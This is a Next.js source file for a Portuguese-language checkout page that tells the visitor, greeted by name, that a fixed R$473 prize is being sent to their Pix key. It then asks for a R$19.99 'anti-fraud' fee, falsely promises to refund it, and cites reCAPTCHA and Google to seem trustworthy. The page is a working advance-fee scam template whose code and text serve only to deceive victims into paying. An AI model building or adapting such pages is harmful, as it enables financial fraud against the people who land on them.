import Image from "next/image";
import Logo from '@/assets/logo-green.png'
import { cookies } from "next/headers";

export default function CheckoutPage() {


  const name = cookies().get('user_name')
  const pixKey = cookies().get('user_pix_key')


  return (


    <div className="w-full relative min-h-screen bg-[#181818] text-white">
      <div className="sticky z-50 top-0 left-0 right-0 h-16 bg-black flex items-center justify-between p-5">
        <Image src={Logo} className='object-contain' width={100} height={30} alt='logo' priority />

        <div className='bg-[#01D661] rounded-2xl flex items-center gap-1 p-2'>
          <span className='text-sm font-semibold'>Saldo: </span>
          <span className='text-sm font-semibold'>{new Intl.NumberFormat('pt-BR', {
            style: 'currency',
            currency: 'BRL'
          }).format(473)}</span>
        </div>

      </div>

      <div className='w-full p-5'>
        <div className='w-full bg-black rounded-lg p-5 space-y-8'>

          <h2 className='text-2xl font-bold text-center'>Parabéns, {name?.value.toUpperCase().split(" ")[0]}!</h2>



          <div className='text-center bg-[#01d661]/40 border border-[#01D661] p-4 rounded-lg text-white/90'>
            Enviando <span className='text-sm font-bold text-white'>{new Intl.NumberFormat('pt-BR', {
              style: 'currency',
              currency: 'BRL'
            }).format(473)}
            </span>
            {" "}para a chave pix {pixKey?.value}!
          </div>


          <p className="text-[#a8a8a8] text-center text-sm">
            Usamos uma taxa <span className="text-white font-bold">anti-fraude</span> para evitar fraudes e abusos dos saques que estavam acontecendo dentro do nosso <span className="text-white font-bold">sistema.</span>
          </p>


          <p className="text-[#a8a8a8] text-center text-sm">Fique tranquilo, você receberá o valor
            da taxa de <span className="text-white font-bold">R$ 19,99 de volta junto ao valor resgatado,</span> é apenas uma etapa
            para verificar que você não é um robô.</p>



          <a href="" className="w-full text-black text-center bg-[#01D661] rounded-3xl h-12 font-bold flex items-center justify-center">
            FINALIZAR & RECEBER
          </a>


          <p className="text-center text-[#a8a8a8] pt-10">
            Este site é protegido pelo reCAPTCHA e está sujeito à <b className="text-[#01d661]">Política de Privacidade</b> e aos <b className="text-[#01d661]">Termos de Serviço do Google.</b>
          </p>

        </div>
      </div>




    </div>

  )
}